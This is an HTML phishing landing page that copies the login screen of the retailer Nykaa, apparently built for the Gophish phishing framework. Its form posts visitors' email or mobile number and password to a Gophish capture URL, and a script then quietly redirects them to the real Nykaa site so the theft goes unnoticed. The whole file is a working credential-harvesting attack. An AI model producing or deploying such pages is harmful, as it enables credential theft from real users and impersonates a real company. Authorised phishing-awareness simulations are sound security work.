<!DOCTYPE html>
<html>
  <head>
    <title>Nykaa Login - Test</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f5f5f5;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      .login-container {
        background: #fff;
        padding: 30px;
        border-radius: 10px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        width: 350px;
      }
      h2 {
        color: #ff4081;
        text-align: center;
      }
      input[type="text"],
      input[type="password"] {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border-radius: 5px;
        border: 1px solid #ccc;
      }
      button {
        width: 100%;
        background-color: #ff4081;
        color: #fff;
        padding: 10px;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
      }
      button:hover {
        background-color: #e73370;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <h2>Nykaa Login</h2>
      <!-- Note: The form action must be exactly {{.URL}} for Gophish to capture credentials -->
      <form method="POST" action="{{.URL}}">
        <input
          type="text"
          name="username"
          placeholder="Enter Email or Mobile"
          required />
        <input
          type="password"
          name="password"
          placeholder="Enter Password"
          required />
        <button type="submit">Login</button>
      </form>
    </div>

    <!-- Redirect script: sends user to real Nykaa after submission -->
    <script>
      const form = document.querySelector("form");
      form.addEventListener("submit", function () {
        setTimeout(() => {
          window.location.href = "https://www.nykaa.com/";
        }, 100); // small delay to let Gophish capture credentials
      });
    </script>
  </body>
</html>
